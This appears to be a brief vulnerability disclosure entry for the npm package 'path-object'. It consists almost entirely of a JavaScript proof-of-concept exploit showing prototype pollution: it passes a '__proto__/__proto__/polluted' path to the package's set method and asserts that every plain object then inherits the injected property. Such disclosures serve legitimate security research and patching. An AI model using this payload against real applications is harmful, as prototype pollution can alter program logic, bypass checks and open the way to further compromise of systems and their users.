# path-object

- package name: `path-object`

- PoC exploit:

```javascript
var Path = require('path-object')();
assert(({}).polluted === undefined);

Path().set('__proto__/__proto__/polluted', 'yes');
assert(({}).polluted === 'yes')
```